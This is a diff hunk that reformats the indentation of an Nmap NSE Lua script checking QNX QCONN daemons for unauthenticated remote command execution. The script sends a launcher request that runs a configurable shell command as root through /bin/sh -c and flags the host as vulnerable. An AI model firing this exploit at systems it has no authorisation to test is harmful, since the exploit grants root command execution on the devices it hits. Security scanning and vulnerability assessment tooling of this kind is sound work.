@@ -61,54 +61,54 @@ categories = {"intrusive", "exploit", "vuln"}
 portrule = shortport.port_or_service ({8000}, "qconn", {"tcp"})
 
 action = function( host, port )
-	local vuln_table = {
-	title = "The QNX QCONN daemon allows remote command execution.",
-	state = vulns.STATE.NOT_VULN,
-	risk_factor = "High",
-	description = [[
+  local vuln_table = {
+    title = "The QNX QCONN daemon allows remote command execution.",
+    state = vulns.STATE.NOT_VULN,
+    risk_factor = "High",
+    description = [[
 The QNX QCONN daemon allows unauthenticated users to execute arbitrary operating
 system commands as the 'root' user.
 ]],
 
-	references = {
-		'http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos',
-		'http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec'
-		}
-	}
+    references = {
+      'http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos',
+      'http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec'
+    }
+  }
 
-	-- Set socket timeout
-	local timeout = (stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout")) or 30)
+  -- Set socket timeout
+  local timeout = (stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout")) or 30)
 
-	-- Set max bytes to retrieve
-	local bytes = (stdnse.get_script_args(SCRIPT_NAME .. '.bytes') or 1024)
+  -- Set max bytes to retrieve
+  local bytes = (stdnse.get_script_args(SCRIPT_NAME .. '.bytes') or 1024)
 
-	-- Set command to execute
-	local cmd = (stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or "uname -a")
+  -- Set command to execute
+  local cmd = (stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or "uname -a")
 
-	-- Send command as service launcher request
-	local req = string.format("service launcher\nstart/flags run /bin/sh /bin/sh -c \"%s\"\n", cmd)
-	stdnse.print_debug(1, ("%s: Connecting to %s:%s"):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
-	local status, data = comm.exchange(host, port, req, {timeout=timeout*1000,bytes=bytes})
-	if not status then
-		stdnse.print_debug(1, ("%s: Timeout exceeded for %s:%s (Timeout: %ss)."):format(SCRIPT_NAME, host.targetname or host.ip, port.number, timeout))
-		return
-	end
+  -- Send command as service launcher request
+  local req = string.format("service launcher\nstart/flags run /bin/sh /bin/sh -c \"%s\"\n", cmd)
+  stdnse.print_debug(1, ("%s: Connecting to %s:%s"):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
+  local status, data = comm.exchange(host, port, req, {timeout=timeout*1000,bytes=bytes})
+  if not status then
+    stdnse.print_debug(1, ("%s: Timeout exceeded for %s:%s (Timeout: %ss)."):format(SCRIPT_NAME, host.targetname or host.ip, port.number, timeout))
+    return
+  end
 
-	-- Parse response
-	stdnse.print_debug(2, ("%s: Received reply:\n%s"):format(SCRIPT_NAME, data))
-	if not string.match(data, "QCONN") then
-		stdnse.print_debug(1, ("%s: %s:%s is not a QNX QCONN daemon."):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
-		return
-	end
+  -- Parse response
+  stdnse.print_debug(2, ("%s: Received reply:\n%s"):format(SCRIPT_NAME, data))
+  if not string.match(data, "QCONN") then
+    stdnse.print_debug(1, ("%s: %s:%s is not a QNX QCONN daemon."):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
+    return
+  end
 
-	-- Check if the daemon attempted to execute the command
-	if string.match(data, 'OK [0-9]+\r?\n') then
-		vuln_table.state = vulns.STATE.VULN
-		local report = vulns.Report:new(SCRIPT_NAME, host, port)
-		return report:make_output(vuln_table)
-	else
-		stdnse.print_debug(1, ("%s: %s:%s QNX QCONN daemon is not vulnerable."):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
-		return
-	end
+  -- Check if the daemon attempted to execute the command
+  if string.match(data, 'OK [0-9]+\r?\n') then
+    vuln_table.state = vulns.STATE.VULN
+    local report = vulns.Report:new(SCRIPT_NAME, host, port)
+    return report:make_output(vuln_table)
+  else
+    stdnse.print_debug(1, ("%s: %s:%s QNX QCONN daemon is not vulnerable."):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
+    return
+  end
 
 end
